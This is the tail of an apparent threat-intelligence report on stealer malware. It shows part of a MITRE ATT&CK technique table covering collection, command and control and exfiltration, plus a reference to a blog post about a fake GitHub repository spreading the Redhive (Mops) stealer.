| Collection           | T1113 Screen Capture, T1115 Clipboard Data, T1005 Data from Local System, T1560 Archive Collected Data                                                                                            |
| Command and control  | T1071.001 Web Protocols, T1571 Non-Standard Port, T1568.002 DGA, T1008 Fallback Channels, T1105 Ingress Tool Transfer                                                                             |
| Exfiltration         | T1048 Exfiltration Over Alternative Protocol (raw TCP)                                                                                                                                            |


## References {#references}

-   winslow, [Hey, You Hacked a Hacker! Are You Ready For My Revenge?](https://winslow1984.com/books/threat-intelligence/page/hey-you-hacked-a-hacker-are-you-ready-for-my-revenge), Winslow Blog, 2026:
    a victim's view of the same platform, from a fake GitHub repository to the Redhive (Mops) stealer
    `1.0.2` and the operator's infrastructure.
